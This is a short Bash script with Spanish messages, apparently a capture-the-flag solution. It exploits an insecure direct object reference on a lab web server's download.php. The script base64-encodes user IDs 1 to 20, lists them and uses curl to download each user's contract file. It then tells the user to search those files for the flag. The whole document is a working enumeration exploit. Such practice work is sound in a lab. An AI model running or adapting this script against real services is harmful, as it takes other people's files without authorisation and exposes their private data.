#!/bin/bash

URL="http://94.237.61.202:56565/download.php"

declare -a UIDS
declare -a CONTRACTS

echo "[*] Enumerando contratos (UID 1–20)..."
echo

i=1
for uid in {1..20}; do
    encoded=$(echo -n "$uid" | base64)
    filename="contract_uid_${uid}"
    UIDS[$i]=$uid
    CONTRACTS[$i]=$encoded

    printf "[%d] UID %d → contract=%s\n" "$i" "$uid" "$encoded"
    ((i++))
done

echo
read -p "¿Qué deseas hacer? (a = todos | n = ninguno | número = archivo específico): " choice
echo

download_contract () {
    local uid=$1
    local contract=$2
    local outfile="contract_uid_${uid}"

    echo "[↓] Descargando UID $uid → $outfile"
    curl -s "$URL?contract=$contract" -o "$outfile"
}

if [[ "$choice" == "a" ]]; then
    for i in "${!UIDS[@]}"; do
        download_contract "${UIDS[$i]}" "${CONTRACTS[$i]}"
    done

elif [[ "$choice" == "n" ]]; then
    echo "[*] No se descargó ningún archivo."
    exit 0

elif [[ "$choice" =~ ^[0-9]+$ ]] && [[ -n "${UIDS[$choice]}" ]]; then
    download_contract "${UIDS[$choice]}" "${CONTRACTS[$choice]}"

else
    echo "[!] Opción inválida."
    exit 1
fi

echo
echo "[✔] Descarga finalizada"
echo "[ℹ] Usa 'ls' y luego 'cat contract_uid_X' para encontrar la FLAG"
